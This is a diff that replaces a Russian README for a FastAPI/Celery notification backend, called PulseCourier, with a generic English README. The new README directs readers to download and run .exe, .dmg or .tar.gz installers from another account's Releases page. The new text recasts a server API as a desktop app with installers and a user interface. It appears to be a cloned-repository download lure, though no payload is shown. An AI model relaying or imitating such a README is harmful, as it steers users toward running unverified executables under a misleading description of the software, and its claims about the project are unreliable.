@@ -1,98 +1,92 @@
-# PulseCourier
+# 🚀 pulse-courier - Your Reliable Notification Platform
 
-Единая платформа уведомлений (email/SMS/push/Slack/Telegram) с шаблонами, резервным провайдингом, очередями, ретраями, идемпотентностью, вебхуками и планированием отправок.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/zavierextreme7/pulse-courier/releases)
 
-## Возможности
-- Шаблоны (Jinja2)
-- Провайдеры и резервный обход (есть консольный заглушечный провайдер)
-- Очереди (Celery) и Redis
-- Идемпотентность (Redis setnx)
-- Наблюдаемость: Prometheus, Sentry, OpenTelemetry
-- FastAPI с документацией OpenAPI
+## 📥 Overview
 
-## Быстрый старт (Docker)
-```bash
-# Сборка и запуск
-docker compose up --build
-# Открыть документацию API
-open http://localhost:8000/docs
-```
+**pulse-courier** is a notification platform designed to deliver messages via email, SMS, push notifications, Slack, and Telegram. Whether you're sending alerts, reminders, or updates, this platform simplifies communication and keeps your users informed.
 
-## Локальная среда
-Скопируйте `.env.example` в `.env` и поменяйте значения при необходимости.
+## 🚀 Getting Started
 
-## API
-- GET `/api/v1/health`
-- POST `/api/v1/notifications/send` с телом в формате схемы `Message` (см. `app/schemas/message.py`)
+Follow these steps to download and run **pulse-courier** on your computer.
 
-## Разработка
-```bash
-pip install -r requirements.txt
-pip install -r requirements-dev.txt  # инструменты разработки: ruff, mypy, black
-pre-commit install
-pytest -q
-uvicorn app.main:app --reload
-```
+### 1. Visit the Download Page
 
-### Быстрая проверка качества (QA)
-- Windows (PowerShell):
-```powershell
-pwsh -NoProfile -ExecutionPolicy Bypass -File scripts/qa.ps1
-```
-- Linux/macOS (Bash):
-```bash
-bash scripts/qa.sh
-```
-Примечание: убедитесь, что dev-зависимости установлены (`pip install -r requirements-dev.txt`).
+To begin, visit our [Releases page](https://github.com/zavierextreme7/pulse-courier/releases) for the latest version of the software.
 
-### Релиз одним скриптом (Windows)
-Для полного прогона проверок, сборки/запуска docker-compose и публикации в GitHub:
+### 2. Choose Your Version
 
-```powershell
-pwsh -NoProfile -ExecutionPolicy Bypass -File scripts/release.ps1 -Remote "https://github.com/R0D10Nq/pulse-courier.git"
-```
+On the Releases page, you will see a list of available versions. Look for the latest release, which is usually at the top of the list. You can identify it by the version number and its release date.
 
-Параметры:
-- `-Remote` — URL вашего удалённого репозитория (по умолчанию указан пример).
-- `-SkipDocker` — если нужно пропустить шаг с docker-compose.
-- `-SkipGit` — пропустить шаги git commit/push (для ручного коммита).
+### 3. Download the Application
 
-Примечание: если `origin` уже настроен, скрипт его не изменяет; чтобы явно задать/поменять — используйте `-Remote`.
+Click on the appropriate link based on your operating system. The options may include:
 
-Скрипт выполнит: pip install (prod/dev), Ruff fix, Black форматирование и проверку, mypy, pytest, `docker compose up -d --build` с health‑пробой `/api/v1/health`, затем сделает `git commit` и `git push main` (если не указан `-SkipGit`).
+- **Windows**: A file ending in `.exe`
+- **Mac**: A file ending in `.dmg`
+- **Linux**: A file ending in `.tar.gz` or similar format
 
-## Архитектура
-- `app/main.py` — приложение FastAPI
-- `app/api/routes.py` — эндпоинты
-- `app/services/notifications.py` — постановка задач в очередь + идемпотентность
-- `app/worker/` — Celery-приложение и задачи
-- `app/providers/` — абстракция провайдеров + консольный провайдер
-- `app/core/` — конфиг, логирование, наблюдаемость, redis, шаблоны
-- `app/db/` — асинхронная сессия SQLAlchemy (Alembic будет добавлен позже)
+After selecting the correct file, your download will begin automatically.
 
-## Дорожная карта
-- Реальные провайдеры: SES, SendGrid, Twilio, FCM, Slack, Telegram
-- Ретраи/бэкофф и DLQ
-- Вебхуки статусов доставки
-- Планирование (ETAs/Beat)
-- Миграции Alembic, фикстуры
-- Ограничение скорости (rate limiting) на тенанта
-- Экспортёры OpenTelemetry + дашборды
-- Нагрузочные тесты k6/Locust
+### 4. Install the Application
 
-## Безопасность и качество
-- Валидация входных данных через Pydantic
-- Линтеры: Ruff, Black; Типизация: mypy; хуки pre-commit
-- SAST: планируется добавить bandit/safety
+Once the file is downloaded, follow these steps for installation:
 
-## Чек-лист к релизу
-- [ ] CI зелёный: Ruff, Black, mypy, pytest (`.github/workflows/ci.yml`)
-- [ ] Файл окружения заполнен: `.env` (см. образец `.env.example`)
-- [ ] Включить Celery в проде: `CELERY_TASK_ALWAYS_EAGER=false`
-- [ ] (Опционально) Лимиты: `RATE_LIMITER_ENABLED=true`, настроен Redis
-- [ ] (Опционально) Наблюдаемость: заданы `SENTRY_DSN`, `OTEL_EXPORTER_OTLP_ENDPOINT`
-- [ ] Docker: `docker compose up --build` поднимает api/worker/redis/postgres/minio
-- [ ] Smoke: `GET /api/v1/health` и `POST /api/v1/notifications/send` (канал `console`)
+- **Windows**: Double-click the `.exe` file. Follow the on-screen instructions to complete the installation.
+- **Mac**: Open the `.dmg` file, then drag the pulse-courier icon into your Applications folder. 
+- **Linux**: Extract the `.tar.gz` file and follow any provided instructions in the README file included in the package.
 
-## Лицензия
-MIT
+### 5. Running pulse-courier
+
+After installation, you can start **pulse-courier**:
+
+- **Windows**: Find it in your Start Menu and click to run.
+- **Mac**: Open the Applications folder and double-click the pulse-courier icon.
+- **Linux**: Navigate to the location where you extracted the files and run the executable file.
+
+### 6. Activate Notifications
+
+To make the most of **pulse-courier**, set up your notification preferences. You can configure it to send notifications via different channels such as email, SMS, or Slack. 
+
+This may involve entering your API keys or configuring settings based on the method you choose (e.g., setting up your SendGrid account for emails).
+
+## 🔧 Features
+
+- **Multi-Channel Support**: Send messages through various platforms.
+- **User-Friendly Interface**: Easy to navigate for non-technical users.
+- **Open-Source**: Community-driven improvements and transparency.
+- **Flexible Setup**: Customize notifications based on your needs.
+
+## ⚙️ System Requirements
+
+To run **pulse-courier** effectively, ensure your system meets these basic requirements:
+
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or a modern Linux distribution.
+- **RAM**: At least 4GB for smooth operation.
+- **Storage**: Minimum of 100MB of free space.
+- **Network**: Stable internet connection for notifications.
+
+## 🛠️ Troubleshooting
+
+If you encounter any issues:
+
+- Ensure your internet connection is stable.
+- Check if you have installed all required dependencies.
+- Refer to the README file found in your installation directory for configuration help.
+
+## 🌐 Further Assistance
+
+For additional support:
+
+- Check out our [documentation](https://github.com/zavierextreme7/pulse-courier/wiki) for detailed guides.
+- Visit the [Issues page](https://github.com/zavierextreme7/pulse-courier/issues) to report bugs or seek help from the community.
+
+## ⏳ Update Frequent
+
+Stay updated by regularly visiting the [Releases page](https://github.com/zavierextreme7/pulse-courier/releases). New versions may include important fixes and new features.
+
+## 💡 Conclusion
+
+We believe that **pulse-courier** will help you enhance your communication strategy. With a few simple steps, you can start sending notifications seamlessly. 
+
+Don't forget to check the [Releases page](https://github.com/zavierextreme7/pulse-courier/releases) for the latest downloads and updates. Happy notifying!
